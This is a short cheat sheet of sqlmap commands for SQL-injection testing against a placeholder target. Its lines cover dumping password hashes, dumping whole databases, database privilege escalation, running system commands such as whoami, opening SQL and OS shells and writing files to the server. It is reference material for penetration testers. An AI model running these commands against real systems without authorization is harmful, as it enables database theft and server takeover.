# SQLMap-Cheat-Sheet

Target the http://target.com URL using the “-u” flag: <br>
sqlmap -u 'http://target.com'<br>
Specify POST requests by specifying the “–data” flag: <br>
sqlmap -u 'http://target.com' --data='param1=blah&param2=blah'<br><br>
Target a vulnerable parameter in an authenticated session by specifying cookies using the “–cookie” flag: <br>
sqlmap -u 'http://target.com' --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx'<br>
Drop all Set-Cookie requests from the target web server using the “–drop-set-cookie” flag: <br>
sqlmap -u 'http://target.com' -r req.txt --drop-set-cookie<br>
Perform in-depth and risky attacks using the “–level” and “–risk” flags: <br>
sqlmap -u 'http://target.com' --data='param1=blah' --level=5 --risk=3<br>
Specify which POST or GET parameter to target using the “-p” flag: <br>
sqlmap -u 'http://target.com' --data='param1=blah&param2=blah' -p param1<br>
Choose a random User-Agent request header using the “–random-agent” flag: <br>
sqlmap -u 'http://target.com' -r req.txt --random-agent<br>
Target a certain database service using the “–dbms” flag: <br>
sqlmap -u 'http://target.com' -r req.txt --dbms Oracle<br>
Read a request (stored via Burpsuite) target the user parameter (and no other parameters), run risky queries, and dump users and passwords: <br>
sqlmap -r ./req.txt -p user --level=1 --risk=3 --passwords<br>
Attempt privilege escalation on the target database<br>
sqlmap -r ./req.txt --level=1 --risk=3 --privesc<br>
Run the “whoami” command on the target server.<br>
sqlmap -r ./req.txt --level=1 --risk=3 --os-cmd=whoami<br>
Dump everything in the database, but wait one second in-between requests.<br>
sqlmap -r ./req.txt --level=1 --risk=3 --dump --delay=1<br>
Here are some useful options for your pillaging pleasure: <br>
-r req.txt Specify a request stored in a text file, great for saved requests from BurpSuite.<br>
–force-ssl Force SQLmap to use SSL or TLS for its requests.<br>
–level=1 only test against the specified parameter, ignore all others.<br>
–risk=3 Run all exploit attempts, even the dangerous ones (could damage database).<br>
–delay Set a delay in-between requests, great for throttled connections.<br>
–proxy Set to http://127.0.0.1:8080 to pipe requests through BurpSuite for inspection.<br>
–privesc Attempt to elevate the privileges of the database service account.<br>
–all Enumerate everything inside the target database.<br>
–hostname Print the target database’s hostname.<br>
–passwords Find and exfiltrate all users and their password hashes or digests.<br>
–dbs Enumerate all databases accessible via the target webserver.<br>
–comments Enumerate all found comments inside the database.<br>
–sql-shell Return a SQL prompt for interaction.<br>
–os-cmd Attempt to execute a system command.<br>
–os-shell Attempt to return a command prompt or terminal for interaction.<br>
–reg-read Read the specified Windows registry key value.<br>
–file-write Specify a local file to be written to the target server.<br>
–file-dest Specify the remote destination to write a file to.<br>
–technique Specify a letter or letters of BEUSTQ to control the exploit attempts: <br>
    B: Boolean-based blind
    E: Error-based
    U: Union query-based
    S: Stacked queries
    T: Time-based blind
    Q: Inline queries
